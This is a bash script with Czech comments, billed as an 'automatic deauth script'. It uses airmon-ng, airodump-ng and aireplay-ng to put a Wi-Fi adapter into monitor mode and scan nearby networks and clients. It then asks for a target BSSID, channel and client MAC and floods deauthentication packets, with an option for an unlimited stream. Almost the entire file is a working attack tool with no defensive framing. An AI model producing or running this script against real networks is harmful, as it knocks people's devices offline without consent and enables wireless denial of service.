#!/bin/bash

echo "=== Automatický Deauth Skript ==="

# Zastaví konfliktní služby
sudo airmon-ng check kill > /dev/null

# Získá název adaptéru (první wlan zařízení)
ADAPTER=$(iw dev | awk '$1=="Interface"{print $2}' | grep ^wlan | head -n1)

if [ -z "$ADAPTER" ]; then
    echo "❌ Nebyl nalezen žádný Wi-Fi adaptér!"
    exit 1
fi

echo "➡️  Nalezen Wi-Fi adaptér: $ADAPTER"

# Přepnutí do monitor módu
sudo airmon-ng start $ADAPTER > /dev/null
MONITOR="${ADAPTER}mon"
sleep 2

# Skenování okolních sítí
echo "📡 Skenuji okolní Wi-Fi sítě... (zastav pomocí Ctrl+C když najdeš svou)"
sleep 2
sudo timeout 15s airodump-ng $MONITOR

# Výběr BSSID a kanálu
read -p "Zadej BSSID cílové Wi-Fi: " BSSID
read -p "Zadej kanál (CH): " CHANNEL

# Cílení na konkrétní síť a výpis klientů
echo "🎯 Skenuji klienty v síti $BSSID na kanálu $CHANNEL..."
sleep 2
sudo timeout 20s airodump-ng --bssid $BSSID -c $CHANNEL $MONITOR

# Zadání cílové MAC adresy
read -p "Zadej MAC adresu cílového zařízení (klienta): " TARGET
read -p "Počet deauth paketů (např. 100 nebo 0 pro nekonečno): " COUNT

# Spuštění útoku
echo "🚀 Spouštím deauth útok na $TARGET..."
sudo aireplay-ng --deauth $COUNT -a $BSSID -c $TARGET $MONITOR

# Volitelné: vrácení do původního módu
read -p "Chceš ukončit monitor mód a obnovit síť? (y/n): " RESTORE
if [[ "$RESTORE" == "y" || "$RESTORE" == "Y" ]]; then
    sudo airmon-ng stop $MONITOR > /dev/null
    sudo systemctl start NetworkManager
    echo "✅ Monitor mód deaktivován a síť obnovena."
else
    echo "ℹ️ Monitor mód zůstává aktivní jako $MONITOR"
fi
